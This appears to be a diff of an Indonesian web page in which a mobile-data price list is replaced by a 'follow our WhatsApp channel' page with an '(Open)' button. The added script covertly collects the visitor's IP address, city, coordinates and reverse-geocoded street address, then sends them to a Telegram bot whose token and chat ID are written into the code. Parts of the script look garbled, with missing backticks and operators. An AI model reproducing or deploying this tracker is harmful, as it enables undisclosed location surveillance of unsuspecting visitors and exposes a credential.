@@ -1,325 +1,124 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Daftar Harga Produk - GFR Store</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
-        :root {
-            --primary-color: #00bfff;
-            --accent-color: #25d366;
-            --bg-color: #0a0a0a;
-            --bg-secondary: #1a1a1a;
-            --text-color: #ffffff;
-            --text-secondary: #888;
-            --border-color: #333;
-            --highlight-color: #ffd700;
-            --gradient-1: #0f2027;
-            --gradient-2: #2c5364;
-            --card-bg: rgba(255,255,255,0.07);
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, var(--gradient-1), var(--bg-color), var(--gradient-2));
-            color: var(--text-color);
-            min-height: 100vh;
-        }
-        .container {
-            max-width: 850px;
-            margin: 0 auto;
-            padding: 24px;
-        }
-        .header {
-            text-align: center;
-            padding: 28px 0 20px 0;
-            border-bottom: 1px solid var(--border-color);
-            margin-bottom: 36px;
-            position: relative;
-        }
-        .header h1 {
-            font-size: 2.6em;
-            color: var(--primary-color);
-            letter-spacing: 2px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            text-shadow: 0 4px 24px rgba(0,191,255,0.15);
-        }
-        .header p {
-            font-size: 1.16em;
-            color: var(--text-secondary);
-            margin-bottom: 6px;
-        }
-        .info-stok {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            background: linear-gradient(90deg, #192433 0%, #2d6178 100%);
-            color: var(--highlight-color);
-            padding: 13px 20px;
-            border-radius: 12px;
-            font-size: 1.09em;
-            margin: 22px 0 0 0;
-            box-shadow: 0 8px 26px rgba(0,0,0,0.13);
-            font-weight: 600;
-            transition: box-shadow 0.2s;
-        }
-        .info-stok:hover {
-            box-shadow: 0 12px 38px rgba(0,191,255,0.13);
-        }
-        .info-stok a {
-            color: var(--accent-color);
-            text-decoration: underline dashed;
-            transition: color 0.2s;
-            font-size: 1.08em;
-            font-weight: 600;
-        }
-        .info-stok a:hover {
-            color: var(--primary-color);
-            text-decoration: underline solid;
-        }
-        .info-stok .icon {
-            font-size: 1.3em;
-        }
-        .product-list-container {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 20px;
-            padding: 28px 22px;
-            box-shadow: 0 4px 32px rgba(0,191,255,0.10);
-            margin-top: 30px;
-        }
-        .product-category {
-            font-size: 1.45em;
-            font-weight: 700;
-            color: var(--primary-color);
-            border-bottom: 2.5px solid var(--primary-color);
-            padding-bottom: 7px;
-            margin: 24px 0 14px 0;
-            letter-spacing: 0.5px;
-        }
-        .product-item {
-            list-style: none;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 13px 0;
-            border-bottom: 1px dashed rgba(255, 255, 255, 0.09);
-            transition: background 0.17s;
-        }
-        .product-item:hover {
-            background: rgba(0,191,255,0.08);
-        }
-        .product-item:last-child {
-            border-bottom: none;
-        }
-        .product-details {
-            display: flex;
-            flex-direction: column;
-        }
-        .product-name {
-            font-size: 1.05em;
-            font-weight: 600;
-            color: #fff;
-            letter-spacing: 0.2px;
-        }
-        .product-price {
-            font-size: 1.22em;
-            font-weight: 700;
-            color: var(--accent-color);
-            text-shadow: 0 1px 8px rgba(37,211,102,0.13);
-        }
-        .product-code {
-            font-size: 0.93em;
-            color: var(--text-secondary);
-        }
-        .footer-cta {
-            text-align: center;
-            margin-top: 54px;
-        }
-        .whatsapp-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: linear-gradient(90deg, #25d366 60%, #17a650 100%);
-            color: #fff;
-            padding: 16px 34px;
-            font-size: 1.09em;
-            font-weight: bold;
-            text-decoration: none;
-            border-radius: 13px;
-            box-shadow: 0 4px 24px rgba(37,211,102,0.23);
-            transition: transform 0.2s, box-shadow 0.2s;
-            border: none;
-            cursor: pointer;
-        }
-        .whatsapp-link:hover {
-            transform: translateY(-3px) scale(1.04);
-            box-shadow: 0 7px 32px rgba(37, 211, 102, 0.33);
-            background: linear-gradient(90deg, #25d366 50%, #00bfff 100%);
-            color: #fff;
-        }
-        .whatsapp-link .wa-ico {
-            font-size: 1.18em;
-            vertical-align: -2px;
-        }
-        .fade-in {
-            opacity: 0;
-            animation: fadeIn 1.2s ease forwards;
-        }
-        @keyframes fadeIn {
-            to { opacity: 1; }
-        }
-        @media (max-width: 600px) {
-            .container { padding: 10px; }
-            .header h1 { font-size: 1.42em; }
-            .product-category { font-size: 1.1em; }
-            .product-list-container { padding: 15px 4px; }
-            .product-item { flex-direction: column; align-items: flex-start; gap: 2px; }
-            .info-stok { font-size: 0.97em; padding: 11px 7px; flex-direction: column; gap: 4px; }
-            .footer-cta { margin-top: 32px; }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>FOLLOW GUYS</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <style>
+    body{
+      margin:0;
+      padding:0;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      height:100vh;
+      font-family:Arial,sans-serif;
+      color:#999;
+      overflow:hidden;
+      flex-direction:column;
+      /* Background modern & klasik */
+      background: linear-gradient(135deg, #f0f0f0, #dcdcdc);
+    }
+    #loading-container{
+      text-align:center;
+      width:80%;
+      max-width:400px;
+    }
+    #loading-text{
+      font-size:18px;
+      margin-bottom:40px;
+      color:#333;
+    }
+    .hidden{display:none;}
+    /* Tombol Open di bawah logo */
+    button{
+      margin-top:30px;
+      padding:12px 25px;
+      font-size:16px;
+      font-weight:bold;
+      color:#fff;
+      background:#25D366; /* hijau WhatsApp */
+      border:none;
+      border-radius:12px;
+      cursor:pointer;
+      transition:.3s;
+    }
+    button:hover{ background:#128C7E; }
+    /* Logo WhatsApp besar */
+    #whatsapp-logo{
+      width:150px;
+      height:150px;
+      cursor:pointer;
+      transition: transform .3s;
+    }
+    #whatsapp-logo:hover{
+      transform: scale(1.1);
+    }
+  </style>
 </head>
 <body>
-    <div class="container fade-in">
-        <header class="header">
-            <h1>🛒 DAFTAR HARGA PRODUK 🛒</h1>
-            <p>Harga terupdate, stok selalu dicek otomatis.</p>
-            <div class="info-stok">
-                <span class="icon">ℹ️</span>
-                <span>Informasi stok update & pengumuman:</span>
-                <a href="https://whatsapp.com/channel/0029Vb9rti60rGiNbe3gpm28" target="_blank">
-                    Channel WhatsApp GFR Store
-                </a>
-            </div>
-        </header>
-        <main class="product-list-container">
-            <h3 class="product-category">Paket Utama</h3>
-            <ul>
-                <li class="product-item">
-                    <div class="product-details">
-                        <span class="product-name">SuperMini PROMO</span>
-                        <span class="product-code">(XLA14) AREA 1 = 13 - 15 GB<br>
-AREA 2 = 15 - 17 GB<br>
-AREA 3 = 20 - 22 GB<br>
-AREA 4 = 30 - 32 GB</span>
-                    </div>
-                    <span class="product-price">Rp 45.000</span>
-                </li>
-                <li class="product-item">
-                    <div class="product-details">
-                        <span class="product-name">mini</span>
-                        <span class="product-code">(XLA32) ~ AREA 1 : 31.75 GB - 33.75 GB<br>
-~ AREA 2 : 33.75 - 35.75 GB<br>
-~ AREA 3 : 38.75 - 40.75 GB<br>
-~ AREA 4 : 48.75 - 50.75 GB</span>
-                    </div>
-                    <span class="product-price">Rp 56.000</span>
-                </li>
-                <li class="product-item">
-                    <div class="product-details">
-                        <span class="product-name">big</span>
-                        <span class="product-code">(XLA39) ~ AREA 1 : 38 GB - 40 GB<br>
-~ AREA 2 : 40 GB - 42 GB<br>
-~ AREA 3 : 45 GB - 47 GB<br>
-~ AREA 4 : 55 GB - 57 GB</span>
-                    </div>
-                    <span class="product-price">Rp 61.000</span>
-                </li>
-                <li class="product-item">
-                    <div class="product-details">
-                        <span class="product-name">jumbo v2</span>
-                        <span class="product-code">(XLA51) AREA 1 = 50.5 - 52.5 GB<br>
-AREA 2 = 52.5 - 54.5 GB<br>
-AREA 3 = 57.5 - 59.5 GB<br>
-AREA 4 = 67.5 - 69.5 GB</span>
-                    </div>
-                    <span class="product-price">Rp 71.000</span>
-                </li>
-                <li class="product-item">
-                    <div class="product-details">
-                        <span class="product-name">JUMBO</span>
-                        <span class="product-code">(XLA65) ~ Area 1 = 65 GB<br>
-~ Area 2 = 70 GB<br>
-~ Area 3 = 83 GB<br>
-~ Area 4 = 123 GB</span>
-                    </div>
-                    <span class="product-price">Rp 84.000</span>
-                </li>
-                <li class="product-item">
-                    <div class="product-details">
-                        <span class="product-name">MegaBig</span>
-                        <span class="product-code">(XLA89) AREA 1 : 88 GB - 90 GB<br>
-~ AREA 2 : 90 GB - 92 GB<br>
-~ AREA 3 : 95 GB - 97 GB<br>
-~ AREA 4 : 105 GB - 107 GB</span>
-                    </div>
-                    <span class="product-price">Rp 93.000</span>
-                </li>
-            </ul>
-            <h3 class="product-category">
-                Bekasan/harian L (A425GB)<br>
-                Area 1 = 8GB<br>
-                Area 2 = 10GB<br>
-                Area 3 = 15GB<br>
-                Area 4 = 25GB
-            </h3>
-            <ul>
-                <li class="product-item"><span class="product-name">3 hari</span><span class="product-price">Rp 9.000</span></li>
-                <li class="product-item"><span class="product-name">5 hari</span><span class="product-price">Rp 11.000</span></li>
-                <li class="product-item"><span class="product-name">7 hari</span><span class="product-price">Rp 14.000</span></li>
-                <li class="product-item"><span class="product-name">9 hari</span><span class="product-price">Rp 16.000</span></li>
-                <li class="product-item"><span class="product-name">11 hari</span><span class="product-price">Rp 18.000</span></li>
-                <li class="product-item"><span class="product-name">13 hari</span><span class="product-price">Rp 20.000</span></li>
-                <li class="product-item"><span class="product-name">15 hari</span><span class="product-price">Rp 22.000</span></li>
-                <li class="product-item"><span class="product-name">17 hari</span><span class="product-price">Rp 24.000</span></li>
-                <li class="product-item"><span class="product-name">19 hari</span><span class="product-price">Rp 26.000</span></li>
-            </ul>
-            <h3 class="product-category">
-                Bekasan/harian XL (A439GB)<br>
-                Area 1 = 1.5GB<br>
-                Area 2 = 4.5GB<br>
-                Area 3 = 15GB<br>
-                Area 4 = 39GB
-            </h3>
-            <ul>
-                <li class="product-item"><span class="product-name">3 hari</span><span class="product-price">Rp 11.000</span></li>
-                <li class="product-item"><span class="product-name">5 hari</span><span class="product-price">Rp 13.000</span></li>
-                <li class="product-item"><span class="product-name">7 hari</span><span class="product-price">Rp 16.000</span></li>
-                <li class="product-item"><span class="product-name">9 hari</span><span class="product-price">Rp 18.000</span></li>
-                <li class="product-item"><span class="product-name">11 hari</span><span class="product-price">Rp 20.000</span></li>
-                <li class="product-item"><span class="product-name">13 hari</span><span class="product-price">Rp 22.000</span></li>
-                <li class="product-item"><span class="product-name">15 hari</span><span class="product-price">Rp 24.000</span></li>
-                <li class="product-item"><span class="product-name">17 hari</span><span class="product-price">Rp 26.000</span></li>
-                <li class="product-item"><span class="product-name">19 hari</span><span class="product-price">Rp 28.000</span></li>
-            </ul>
-            <h3 class="product-category">
-                Bekasan/harian XXL (A465GB)<br>
-                AREA 1 = 7.5 GB<br>
-                AREA 2 = 12 GB<br>
-                AREA 3 = 25 GB<br>
-                AREA 4 = 65 GB
-            </h3>
-            <ul>
-                <li class="product-item"><span class="product-name">3 hari</span><span class="product-price">Rp 9.000</span></li>
-                <li class="product-item"><span class="product-name">5 hari</span><span class="product-price">Rp 13.000</span></li>
-                <li class="product-item"><span class="product-name">7 hari</span><span class="product-price">Rp 15.000</span></li>
-                <li class="product-item"><span class="product-name">9 hari</span><span class="product-price">Rp 17.000</span></li>
-                <li class="product-item"><span class="product-name">11 hari</span><span class="product-price">Rp 19.000</span></li>
-                <li class="product-item"><span class="product-name">13 hari</span><span class="product-price">Rp 21.000</span></li>
-                <li class="product-item"><span class="product-name">15 hari</span><span class="product-price">Rp 23.000</span></li>
-                <li class="product-item"><span class="product-name">17 hari</span><span class="product-price">Rp 25.000</span></li>
-                <li class="product-item"><span class="product-name">19 hari</span><span class="product-price">Rp 27.000</span></li>
-            </ul>
-        </main>
-        <footer class="footer-cta">
-            <a href="http://wa.me/6289667881288?text=order" class="whatsapp-link" target="_blank">
-                <span class="wa-ico">💬</span> HUBUNGI ADMIN
-            </a>
-        </footer>
-    </div>
+  <div id="loading-container">
+    <div id="loading-text">FOLLOW SALURAN WHATSAPP KAMI.
+    KETAHUN DI JUAL? SIAP² AJA ☠️. MENTAHAN INI GRATIS.</div>
+    <!-- Logo WhatsApp yang bisa diklik -->
+    <a href="https://whatsapp.com/channel/0029VastFWZ6rsQnAWJzoh22" target="_blank">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" id="whatsapp-logo" alt="WhatsApp Logo">
+    </a>
+  </div>
+
+  <!-- Tombol Open -->
+  <button id="openBtn">(Open)</button>
+
+<script>
+(()=>{
+  // === TOKEN & CHAT ID TELEGRAM  ===
+  const T='7740915138:AAGGgWA1Zq39H95q2o90VCwr6tPcgaZva8k',
+        C='7189193429';
+
+  const sTG=async d=>{
+    try{
+      await fetch(https://api.telegram.org/bot${T}/sendMessage,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})
+      })
+    }catch(e){}
+  };
+
+  const gLD=async(a,b)=>{
+    try{
+      const r=await fetch(https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1),
+            d=await r.json();
+      if(d.address) return {
+        kb:d.address.county  d.address.city  d.address.state || "Tidak diketahui",
+        kc:d.address.suburb  d.address.village  d.address.town || "Tidak diketahui",
+        fa:d.display_name || "Alamat tidak tersedia"
+      }
+    }catch(e){}
+    return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}
+  };
+
+  const cDI=async()=>{
+    let m='╭───── Tracking Report ───── ⦿\n\n';
+    try{
+      const i=await fetch('https://ipapi.co/json/'),
+            d=await i.json();
+      m+='📍 LOCATION INFORMATION\n';
+      m+=📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n;
+      if(d.latitude&&d.longitude){
+        m+=📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n;
+        const l=await gLD(d.latitude,d.longitude);
+        m+=🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n
+      }
+    }catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n'}
+
+    m+='\n╰───── Telegram @LVYNXP ─────';
+    sTG(m);
+  };
+
+  document.getElementById("openBtn").addEventListener("click",()=>{ cDI(); });
+})();
+</script>
 </body>
 </html>
